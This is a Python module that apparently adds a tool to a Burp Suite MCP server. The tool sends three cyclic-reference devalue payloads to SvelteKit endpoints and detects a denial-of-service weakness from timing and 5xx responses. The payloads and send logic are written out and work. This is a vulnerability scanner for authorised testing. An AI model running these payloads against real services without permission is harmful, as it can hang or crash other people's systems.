"""SvelteKit-specific probes — devalue cyclic-reference DoS on +server.ts endpoints.

CVE-2026-22774/22775/22803 class — crafted devalue-encoded body with
self-reference loop causes parser stack growth / O(n^2) traversal /
hang on poorly-bounded implementations.

Returns VerdictResult. Detection via elapsed_ms vs baseline + 5xx.
"""

from __future__ import annotations

import json
import time

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client
from burpsuite_mcp.tools.testing._verdict import make_verdict, error_verdict


_DEVALUE_CYCLES = [
    # Two-element cycle A→B→A. Some implementations follow the first
    # array reference without de-dup tracking and recurse indefinitely.
    "[[1,2],[\"$\",1],[\"$\",0]]",
    # Self-reference: element 0 points to itself.
    "[[1,1],[\"$\",0]]",
    # Deep nested self-ref via index alias.
    "[[1,3],[\"$\",2],[\"$\",1],[\"$\",2]]",
]

_DEVALUE_MAX_SAFE = '[[1,1],[{"x":0}]]'  # well-formed devalue baseline

_TIMING_RATIO = 4.0
_TIMING_DELTA_MS = 1500
_MAX_VARIANTS = 3
_TIMEOUT_SEC = 8.0


def register(mcp: FastMCP) -> None:

    @mcp.tool()
    async def probe_sveltekit_devalue_dos(
        target_url: str,
        method: str = "POST",
        content_type: str = "application/json",
        session: str = "",
    ) -> dict:
        """Probe SvelteKit +server.ts endpoint for devalue cyclic-reference DoS.

        CVE-2026-22774/22775/22803 class — SvelteKit's devalue serializer can
        loop / stack-overflow on a hand-crafted graph with intra-array
        self-references. This sends a baseline well-formed devalue body, then
        up to 3 cyclic variants, and compares elapsed_ms.

        Args:
            target_url: SvelteKit +server.ts endpoint URL.
            method: HTTP method (default POST). PUT/PATCH also accepted.
            content_type: Request Content-Type header (default
                application/json — devalue parsing is body-shape-triggered
                regardless of CT in current SvelteKit).
            session: Optional session name for authenticated probing.

        Returns: VerdictResult — CONFIRMED if any variant's elapsed >= 4x
        baseline AND >= +1500ms, SUSPECTED if any variant 5xx, else FAILED.
        """
        if not target_url:
            return error_verdict("target_url required", vuln_type="sveltekit_devalue_dos")

        # Baseline
        baseline_start = time.time()
        baseline_resp = await _send(target_url, method, content_type, _DEVALUE_MAX_SAFE, session)
        baseline_ms = int((time.time() - baseline_start) * 1000)
        if "error" in baseline_resp:
            return error_verdict(
                f"baseline send failed: {baseline_resp['error']}",
                vuln_type="sveltekit_devalue_dos",
            )
        baseline_status = baseline_resp.get("status_code") or baseline_resp.get("status")
        baseline_logger = baseline_resp.get("logger_index") or baseline_resp.get("proxy_index", -1)

        reproductions: list[dict] = [{
            "label": "baseline",
            "elapsed_ms": baseline_ms,
            "status_code": baseline_status,
            "logger_index": baseline_logger,
        }]
        timing_hits = 0
        status_5xx_hits = 0

        for i, payload in enumerate(_DEVALUE_CYCLES[:_MAX_VARIANTS], 1):
            start = time.time()
            resp = await _send(target_url, method, content_type, payload, session)
            elapsed = int((time.time() - start) * 1000)
            status = resp.get("status_code") or resp.get("status")
            logger_idx = resp.get("logger_index") or resp.get("proxy_index", -1)
            entry = {
                "label": f"cycle_{i}",
                "payload_preview": payload[:60],
                "elapsed_ms": elapsed,
                "status_code": status,
                "logger_index": logger_idx,
            }
            reproductions.append(entry)
            ratio = (elapsed / baseline_ms) if baseline_ms > 0 else 0
            if elapsed >= baseline_ms + _TIMING_DELTA_MS and ratio >= _TIMING_RATIO:
                timing_hits += 1
                entry["matched"] = "timing"
            elif status in (500, 502, 504):
                status_5xx_hits += 1
                entry["matched"] = f"status_{status}"

        if timing_hits >= 1:
            return make_verdict(
                "CONFIRMED",
                0.85,
                f"SvelteKit devalue DoS — {timing_hits} cyclic variant(s) "
                f"elapsed >= {_TIMING_RATIO}x baseline ({baseline_ms}ms)",
                vuln_type="sveltekit_devalue_dos",
                logger_indices=[r["logger_index"] for r in reproductions if isinstance(r.get("logger_index"), int) and r["logger_index"] >= 0],
                reproductions=reproductions,
                details={"timing_hits": timing_hits, "status_5xx_hits": status_5xx_hits},
                summary=f"CONFIRMED devalue DoS on {target_url} ({timing_hits}/{_MAX_VARIANTS} variants)",
            )

        if status_5xx_hits >= 1:
            return make_verdict(
                "SUSPECTED",
                0.55,
                f"SvelteKit devalue probe — {status_5xx_hits} cyclic variant(s) "
                f"returned 5xx (parser failed but no timing spike)",
                vuln_type="sveltekit_devalue_dos",
                logger_indices=[r["logger_index"] for r in reproductions if isinstance(r.get("logger_index"), int) and r["logger_index"] >= 0],
                reproductions=reproductions,
                details={"timing_hits": 0, "status_5xx_hits": status_5xx_hits},
                summary=f"SUSPECTED parser fragility on {target_url} ({status_5xx_hits} 5xx)",
            )

        return make_verdict(
            "FAILED",
            0.10,
            "SvelteKit devalue cyclic-reference probes did not trigger DoS",
            vuln_type="sveltekit_devalue_dos",
            logger_indices=[r["logger_index"] for r in reproductions if isinstance(r.get("logger_index"), int) and r["logger_index"] >= 0],
            reproductions=reproductions,
            details={"timing_hits": 0, "status_5xx_hits": 0},
            summary=f"FAILED — no DoS signal on {target_url}",
        )


async def _send(url: str, method: str, content_type: str, body: str, session: str) -> dict:
    """Send via session if provided, else direct curl. Returns Burp client dict."""
    if session:
        return await client.post("/api/session/request", json={
            "session": session,
            "method": method,
            "url": url,
            "headers": [{"name": "Content-Type", "value": content_type}],
            "body": body,
        })
    return await client.post("/api/http/curl", json={
        "url": url,
        "method": method,
        "headers": [{"name": "Content-Type", "value": content_type}],
        "data": body,
    })
